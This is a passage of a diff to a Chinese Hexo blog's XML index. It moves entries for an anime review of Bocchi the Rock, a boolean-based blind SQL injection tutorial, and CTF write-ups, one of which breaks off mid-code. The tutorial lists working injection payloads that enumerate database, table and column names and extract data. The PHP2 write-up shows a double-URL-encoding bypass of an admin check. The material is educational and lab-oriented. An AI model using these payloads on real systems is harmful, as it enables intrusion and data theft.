+<h1 id="观众的共鸣"><a href="#观众的共鸣" class="headerlink" title="观众的共鸣"></a>观众的共鸣</h1><p>本作在社恐方面做足了细节，这也直接导致了观众对这部作品产生强烈共鸣，将角色代入自身。虽然观众大多不会对社交完全恐惧，同样也不会完全外向。生活中的人们，多多少少有些社交上的恐惧感，尽管不如波奇，也只不过是层级不同罢了。<br>随便一举都有很多：期望别人主动和自己搭话、不敢直视别人、不会拒绝别人、不敢去人多的地方、穿着土气、弯腰驼背、害怕冒犯别人、团队协作能力较差、别人一夸赞自己就沾沾自喜或者觉得这个人是好人、没有外号、不会跟不熟的人打招呼、没有朋友、不敢一个人进店、想去没有同学认识自己的地方、独来独往、会进入自己的世界、无法打工、一个人吃饭、喜欢幻想、几个人说话的时候插不上嘴……细节太多怎也道不完。有些比较夸张，可这是喜剧，也没必要纠结了。<br>孤单与喜欢独处的人是不一样的。波奇是孤单的人，但凉是喜欢独处并且充满自信。我大概也是和凉更为相像吧。</p>
+<h1 id="喜剧的剖析"><a href="#喜剧的剖析" class="headerlink" title="喜剧的剖析"></a>喜剧的剖析</h1><p>本作中主要出现的喜剧方面有，因波奇的内向而让她作出与常人不同的行为或想法而产生的反差造成的喜感，或是通过画面夸张化波奇的社恐心理（波奇融化，波奇变成赛博朋克，波奇变成恐龙等等），还有乐队四人不同个性的有趣小日常。</p>
+<h1 id="乐队的成长"><a href="#乐队的成长" class="headerlink" title="乐队的成长"></a>乐队的成长</h1><p>波奇从一个害怕与人社交的高中生，最终成为乐队里不可或缺的一份子。中间也是一路艰辛啊。<br>第1阶段，无法与乐队成员在演奏上好好配合，无论什么事都很被动，也很害怕与人打交道，甚至无法在台上露脸演奏。（1话）<br>第2阶段，稍微变得主动了一些，也能够独自进店了，打工时勉强能直视顾客的眼睛。还是害怕与别人有所不同，一旦做了什么错事或没做到什么会害怕得不能自已，看到别人享受青春的样子会很难受，不敢与别人搭话。（2-7话）<br>第3阶段，配合变好了一些，乐队之间的关系更加亲密了。（8-12话）</p>
+<p>喜多从第3话一个乐队外行人到了最终话演奏的时候也变得能够独自演奏一些片段了。</p>
+<p>整个乐队从配合松散的四人慢慢变为了有默契的四人，一起打工，一起游玩，一起演奏，一起出行…四人一起更加有乐队的感觉了。</p>
+<h1 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h1><p>虽然只有短短12话，我却看得十分尽兴。<br>第5话，第8话，第12话这三段演奏都做得非常好，即便如此，还是有部分人不满，原因很简单，没有爆点。追求快的时代，拿不出一个爆点的话，那么是很难吸引快节奏人的目光的。从我个人的意愿来说，也不例外，希望有能够惊为天人的live。虽然没有期待到啦，不过也不至于成为挑刺的地方。三段演奏都是蛮棒的，写实的风格，创新的演出，越看越耐看的live，都是无可挑剔的。<br>最喜欢的角色嘛，是虹夏。现在虹夏已经被大家尊称为“下北泽の大天使”了hhh。<br>如果说我在四个人里最像凉，那么大概也能明白为什么一开始凉是和虹夏一起的了。若要问喜欢的原因，大概是那份细腻感吧，能够注意到乐队其他人不会注意到的事，而且还那么温柔，与喜多那种外向的阳光普照大地不同，虹夏的阳光是单独照射着她所在意的人的。还有也非常可爱啊，第5话最后那个告别怎能叫人不心动呢！<br><img src="/images/%E8%99%B9%E5%A4%8F_4.gif" alt="虹夏告别"></p>
+<h1 id="总的来说"><a href="#总的来说" class="headerlink" title="总的来说"></a>总的来说</h1><p>赶紧出下一季！</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>动画评价写得好烂，还写了那么久，什么时候能写好一点啊！</p>
+]]></content>
+      <categories>
+        <category>动画，孤独摇滚</category>
+      </categories>
+      <tags>
+        <tag>孤独摇滚</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>如何寻觅动画</title>
     <url>/2022/11/04/%E5%8A%A8%E6%BC%AB%E8%B5%84%E6%BA%90/</url>
     <content><![CDATA[<p><img src="/images/%E9%98%BF%E5%BD%BB.gif" alt="托尔"></p>
@@ -4016,88 +4213,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
-    <title>布尔盲注</title>
-    <url>/2022/11/08/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>基于布尔的盲注是一种常用的，重要的注入方式。</p>
-<span id="more"></span>
-
-<h1 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h1><p>当页面不返回查询信息的数据，只知道返回信息的对错（true or false）时即可用此方式。</p>
-<h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><h2 id="length-函数"><a href="#length-函数" class="headerlink" title="length()函数"></a>length()函数</h2><p>作用：返回字符串str的长度，以字节为单位。<br>示例：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and length(database())&gt;=1--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=13--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=14--+		页面返回错误</span><br><span class="line"></span><br><span class="line">由此判断得到数据库名的长度是13个字符</span><br></pre></td></tr></table></figure>
-
-<h2 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr()函数"></a>substr()函数</h2><p>作用：从特定位置开始的字符串返回一个给定长度的子字符串<br>用法：<br>substr(str,pos,len)<br>str: 代表待截取的字符串<br>pos: 代表从什么位置开始截取<br>len: 表示字符串截取的长度<br>示例：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and substr(database(),1,1)=&#x27;a&#x27;--+</span><br><span class="line">substr 的用法和 limit 有区别，limit从 0 开始排序，这里从 1 开始排序</span><br><span class="line">这里的字母不区分大小写</span><br></pre></td></tr></table></figure>
-<p>说明：与substr()函数作用相似的函数有mid()和substring()函数，其用法与substr()函数一致。<br>示例：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substring(&#x27;hello&#x27;,1,1)和select mid(&#x27;hello&#x27;,1,1)</span><br><span class="line">都返回&#x27;h&#x27;</span><br></pre></td></tr></table></figure>
-
-<h2 id="ascii-函数"><a href="#ascii-函数" class="headerlink" title="ascii()函数"></a>ascii()函数</h2><p>作用：返回某个字符的ascii码值，ascii()函数只处理单个字符，若是字符串则会处理第一个字符。<br>示例：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ascii(&#x27;h&#x27;)=104 --+</span><br></pre></td></tr></table></figure>
-
-<h2 id="ord-函数"><a href="#ord-函数" class="headerlink" title="ord()函数"></a>ord()函数</h2><p>作用：通常与substr()函数一起使用，用于返回字符的ascii码。<br>示例：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and ord(substr(database(),1,1))=97--+</span><br></pre></td></tr></table></figure>
-<p>说明：ASCII码表中可显示的字符范围是：0~127</p>
-<h1 id="过程步骤"><a href="#过程步骤" class="headerlink" title="过程步骤"></a>过程步骤</h1><ol>
-<li><p>判断数据库名长度</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and length(database())&gt;=1--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=13--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=14--+		页面返回错误</span><br><span class="line"></span><br><span class="line">由此判断得到数据库名的长度是13个字符</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>猜解数据库名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr(database(),2,1)=&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure>
-<p>或</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and ord(substr(database(),1,1))=97--+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>判断数据库表名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;数据库名&#x27; limit 0,1),1,1)=&#x27;a&#x27;--+</span><br><span class="line">--修改1,1前边的1~20，逐字符猜解出第一个表的名</span><br><span class="line">--修改limit的0,1前边的0~20，逐个猜解每个表</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>判断数据库字段名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27; limit 0,1),1,1)=&#x27;a&#x27;--+</span><br><span class="line"></span><br><span class="line">--修改1,1前边的1~20，逐字符猜解出第一个字段的名</span><br><span class="line">--修改limit的0,1前边的0~20，逐个猜解每个字段</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>取数据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr((select 字段名 from 表名 limit 0,1),1,1)=&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p>说明：如果写脚本，采用二分法更佳</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
-<li><a href="https://blog.csdn.net/qq_35569814/article/details/100175886">SQL注入之布尔盲注</a></li>
-<li><a href="https://wiki.wgpsec.org/knowledge/web/sql_injection.html">SQL注入漏洞基本原理</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-        <category>布尔盲注</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>孤独摇滚--忐忑不安的吉他英雄</title>
-    <url>/2022/12/26/%E5%AD%A4%E7%8B%AC%E6%91%87%E6%BB%9A%E5%8A%A8%E7%94%BB/</url>
-    <content><![CDATA[<p><img src="/images/band_2.png" alt="band"></p>
-<span id="more"></span>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>也许是今年看得最开心的新作动画。</p>
-<h1 id="第一印象"><a href="#第一印象" class="headerlink" title="第一印象"></a>第一印象</h1><p>孤独摇滚是芳文社出版的四格漫画，老实说，虽然早就知道将要出动画，由于四格漫画画面太小，让人难以看进去，于是也就没有预先看漫画了。<br>看pv时，其实没有特别在意啦，只是预感会是一部还不错的动画，没想到最终大大超出预期，是一个很棒的惊喜~</p>
-<h1 id="精妙的演出"><a href="#精妙的演出" class="headerlink" title="精妙的演出"></a>精妙的演出</h1><p>应当好好感谢制作组，如果中规中矩按照原作制作动画，大概会是中上水准，可却难以成为大多数人每周最期待的一部动画吧。<br>看动画时第一重要的是有趣，而动画也的确非常有趣，无论是在喜剧部分还是推动情节发展的地方都是“各司其职”，有条不紊。既不让人觉得混乱，也能看得十分开心。</p>
-<ul>
-<li><strong>创新性</strong><br>第1话运用的几个不同寻常的镜头很是吸引我：超广角，腿部运动镜头。这些对我来说都有一种新奇的美感。<br>不止如此，在乐队演奏方面也是不走寻常路，比如第8话十分重要的乐队演出，一般而言，这种重要的情景都会把其演奏过程制作得具有观赏性，而制作组明知这一点还是将一个很“烂”的live完全表现出来了。不得不说，虽然在演奏上是失败的，但如此大胆的策略让剧情更加自然，也一定会被很多人记住吧。</li>
-<li><strong>想象力</strong><br>想象力是演出有趣与否的重要因素，在这方面，制作组拿出了：写实场景的水坝，3D建模，毕加索画作…一系列让人眼前一亮的元素，令人赞不绝口！</li>
-<li><strong>契合度</strong><br>人物方面的契合度至少90%以上。波奇的声优甚至就是社恐，更是有一种声优与角色融为一体的感觉。我认为选择这样的声优比选知名声优好多了，无论一个声优多么有人气或是多么美丽，只要不适合，都应当一票否决。</li>
-</ul>
-<h1 id="观众的共鸣"><a href="#观众的共鸣" class="headerlink" title="观众的共鸣"></a>观众的共鸣</h1><p>本作在社恐方面做足了细节，这也直接导致了观众对这部作品产生强烈共鸣，将角色代入自身。虽然观众大多不会对社交完全恐惧，同样也不会完全外向。生活中的人们，多多少少有些社交上的恐惧感，尽管不如波奇，也只不过是层级不同罢了。<br>随便一举都有很多：期望别人主动和自己搭话、不敢直视别人、不会拒绝别人、不敢去人多的地方、穿着土气、弯腰驼背、害怕冒犯别人、团队协作能力较差、别人一夸赞自己就沾沾自喜或者觉得这个人是好人、没有外号、不会跟不熟的人打招呼、没有朋友、不敢一个人进店、想去没有同学认识自己的地方、独来独往、会进入自己的世界、无法打工、一个人吃饭、喜欢幻想、几个人说话的时候插不上嘴……细节太多怎也道不完。有些比较夸张，可这是喜剧，也没必要纠结了。<br>孤单与喜欢独处的人是不一样的。波奇是孤单的人，但凉是喜欢独处并且充满自信。我大概也是和凉更为相像吧。</p>
-<h1 id="喜剧的剖析"><a href="#喜剧的剖析" class="headerlink" title="喜剧的剖析"></a>喜剧的剖析</h1><p>本作中主要出现的喜剧方面有，因波奇的内向而让她作出与常人不同的行为或想法而产生的反差造成的喜感，或是通过画面夸张化波奇的社恐心理（波奇融化，波奇变成赛博朋克，波奇变成恐龙等等），还有乐队四人不同个性的有趣小日常。</p>
-<h1 id="乐队的成长"><a href="#乐队的成长" class="headerlink" title="乐队的成长"></a>乐队的成长</h1><p>波奇从一个害怕与人社交的高中生，最终成为乐队里不可或缺的一份子。中间也是一路艰辛啊。<br>第1阶段，无法与乐队成员在演奏上好好配合，无论什么事都很被动，也很害怕与人打交道，甚至无法在台上露脸演奏。（1话）<br>第2阶段，稍微变得主动了一些，也能够独自进店了，打工时勉强能直视顾客的眼睛。还是害怕与别人有所不同，一旦做了什么错事或没做到什么会害怕得不能自已，看到别人享受青春的样子会很难受，不敢与别人搭话。（2-7话）<br>第3阶段，配合变好了一些，乐队之间的关系更加亲密了。（8-12话）</p>
-<p>喜多从第3话一个乐队外行人到了最终话演奏的时候也变得能够独自演奏一些片段了。</p>
-<p>整个乐队从配合松散的四人慢慢变为了有默契的四人，一起打工，一起游玩，一起演奏，一起出行…四人一起更加有乐队的感觉了。</p>
-<h1 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h1><p>虽然只有短短12话，我却看得十分尽兴。<br>第5话，第8话，第12话这三段演奏都做得非常好，即便如此，还是有部分人不满，原因很简单，没有爆点。追求快的时代，拿不出一个爆点的话，那么是很难吸引快节奏人的目光的。从我个人的意愿来说，也不例外，希望有能够惊为天人的live。虽然没有期待到啦，不过也不至于成为挑刺的地方。三段演奏都是蛮棒的，写实的风格，创新的演出，越看越耐看的live，都是无可挑剔的。<br>最喜欢的角色嘛，是虹夏。现在虹夏已经被大家尊称为“下北泽の大天使”了hhh。<br>如果说我在四个人里最像凉，那么大概也能明白为什么一开始凉是和虹夏一起的了。若要问喜欢的原因，大概是那份细腻感吧，能够注意到乐队其他人不会注意到的事，而且还那么温柔，与喜多那种外向的阳光普照大地不同，虹夏的阳光是单独照射着她所在意的人的。还有也非常可爱啊，第5话最后那个告别怎能叫人不心动呢！<br><img src="/images/%E8%99%B9%E5%A4%8F_4.gif" alt="虹夏告别"></p>
-<h1 id="总的来说"><a href="#总的来说" class="headerlink" title="总的来说"></a>总的来说</h1><p>赶紧出下一季！</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>动画评价写得好烂，还写了那么久，什么时候能写好一点啊！</p>
-]]></content>
-      <categories>
-        <category>动画，孤独摇滚</category>
-      </categories>
-      <tags>
-        <tag>孤独摇滚</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>报错注入常用函数</title>
     <url>/2022/11/08/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>所谓报错注入，就是SQL注入中页面不会返回正常信息，但是会返回报错信息而产生的一种注入方式。而报错注入在使用函数时会很方便，这里就来介绍三种常用报错函数。</p>
@@ -4168,6 +4283,59 @@ secure_file_priv 一栏的value为空，即是成功</li>
       <categories>
         <category>SQL注入</category>
         <category>报错注入</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>布尔盲注</title>
+    <url>/2022/11/08/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>基于布尔的盲注是一种常用的，重要的注入方式。</p>
+<span id="more"></span>
+
+<h1 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h1><p>当页面不返回查询信息的数据，只知道返回信息的对错（true or false）时即可用此方式。</p>
+<h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><h2 id="length-函数"><a href="#length-函数" class="headerlink" title="length()函数"></a>length()函数</h2><p>作用：返回字符串str的长度，以字节为单位。<br>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and length(database())&gt;=1--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=13--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=14--+		页面返回错误</span><br><span class="line"></span><br><span class="line">由此判断得到数据库名的长度是13个字符</span><br></pre></td></tr></table></figure>
+
+<h2 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr()函数"></a>substr()函数</h2><p>作用：从特定位置开始的字符串返回一个给定长度的子字符串<br>用法：<br>substr(str,pos,len)<br>str: 代表待截取的字符串<br>pos: 代表从什么位置开始截取<br>len: 表示字符串截取的长度<br>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and substr(database(),1,1)=&#x27;a&#x27;--+</span><br><span class="line">substr 的用法和 limit 有区别，limit从 0 开始排序，这里从 1 开始排序</span><br><span class="line">这里的字母不区分大小写</span><br></pre></td></tr></table></figure>
+<p>说明：与substr()函数作用相似的函数有mid()和substring()函数，其用法与substr()函数一致。<br>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substring(&#x27;hello&#x27;,1,1)和select mid(&#x27;hello&#x27;,1,1)</span><br><span class="line">都返回&#x27;h&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="ascii-函数"><a href="#ascii-函数" class="headerlink" title="ascii()函数"></a>ascii()函数</h2><p>作用：返回某个字符的ascii码值，ascii()函数只处理单个字符，若是字符串则会处理第一个字符。<br>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ascii(&#x27;h&#x27;)=104 --+</span><br></pre></td></tr></table></figure>
+
+<h2 id="ord-函数"><a href="#ord-函数" class="headerlink" title="ord()函数"></a>ord()函数</h2><p>作用：通常与substr()函数一起使用，用于返回字符的ascii码。<br>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and ord(substr(database(),1,1))=97--+</span><br></pre></td></tr></table></figure>
+<p>说明：ASCII码表中可显示的字符范围是：0~127</p>
+<h1 id="过程步骤"><a href="#过程步骤" class="headerlink" title="过程步骤"></a>过程步骤</h1><ol>
+<li><p>判断数据库名长度</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and length(database())&gt;=1--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=13--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=14--+		页面返回错误</span><br><span class="line"></span><br><span class="line">由此判断得到数据库名的长度是13个字符</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>猜解数据库名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr(database(),2,1)=&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure>
+<p>或</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and ord(substr(database(),1,1))=97--+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>判断数据库表名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;数据库名&#x27; limit 0,1),1,1)=&#x27;a&#x27;--+</span><br><span class="line">--修改1,1前边的1~20，逐字符猜解出第一个表的名</span><br><span class="line">--修改limit的0,1前边的0~20，逐个猜解每个表</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>判断数据库字段名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27; limit 0,1),1,1)=&#x27;a&#x27;--+</span><br><span class="line"></span><br><span class="line">--修改1,1前边的1~20，逐字符猜解出第一个字段的名</span><br><span class="line">--修改limit的0,1前边的0~20，逐个猜解每个字段</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>取数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr((select 字段名 from 表名 limit 0,1),1,1)=&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>说明：如果写脚本，采用二分法更佳</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
+<li><a href="https://blog.csdn.net/qq_35569814/article/details/100175886">SQL注入之布尔盲注</a></li>
+<li><a href="https://wiki.wgpsec.org/knowledge/web/sql_injection.html">SQL注入漏洞基本原理</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+        <category>布尔盲注</category>
       </categories>
       <tags>
         <tag>SQL注入</tag>
@@ -4473,6 +4641,31 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
+    <title>攻防世界_PHP2</title>
+    <url>/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_PHP2/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一道很简单的题，但我因为基础不牢，导致做不出来。</p>
+<span id="more"></span>
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
+<li><p>查看源码<br>首先页面显示没有意义的一句话。<br>然后我们点鼠标右键尝试查看源代码，无法看到。<br>于是尝试其它方式，比如在url后面加index.phps：<br><code>url/index.phps</code><br>源代码成功显示（用工具扫一下会比较好）</p>
+</li>
+<li><p>分析条件<br>我们看到源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure>
+<p>第1个if语句：要求不能直接在url栏输入admin，否则不予通过。<br>第2个if语句：url解码后的值要与admin相同。</p>
+</li>
+<li><p>构造语句<br>url编码就是一个字符ascii码的十六进制。不过稍微有些变动，需要在前面加上“%”。<br>因此我们将a进行url编码，可得到%61dmin<br>解码后与admin值相同。<br>但这样还不够，因为url栏会先对传上的值解一次码，变成admin，这样在判断第1个if语句时仍然无法通过。<br>因此我们需要二次编码绕过。将%61再次进行编码：%2561<br>最终得到： <code>%2561dmin</code><br>最后拿到flag</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>攻防世界_web2</title>
     <url>/2022/12/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web2/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一次密码破译，还是比较有趣的。</p>
@@ -4515,20 +4708,45 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
-    <title>攻防世界_PHP2</title>
-    <url>/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_PHP2/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一道很简单的题，但我因为基础不牢，导致做不出来。</p>
+    <title>攻防世界_easyphp</title>
+    <url>/2022/12/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_easyphp/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>做了这题才知道自己的php掌握的有多么糟糕…</p>
 <span id="more"></span>
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>查看源码<br>首先页面显示没有意义的一句话。<br>然后我们点鼠标右键尝试查看源代码，无法看到。<br>于是尝试其它方式，比如在url后面加index.phps：<br><code>url/index.phps</code><br>源代码成功显示（用工具扫一下会比较好）</p>
+<h1 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h1><p>攻防世界-&gt;easyphp</p>
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><p>首先是页面代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>) &gt; <span class="number">6000000</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>) &lt;= <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>),-<span class="number">6</span>,<span class="number">6</span>))&#123;</span><br><span class="line">        <span class="variable">$key1</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Emmm...再想想&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Emmm...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>]) &amp;&amp; <span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>] &gt; <span class="number">2022</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) == <span class="number">2</span> &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;DGGJ&quot;</span>, <span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]);</span><br><span class="line">        <span class="variable">$d</span> === <span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;no...&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;DGGJ&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;no......&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$key2</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span 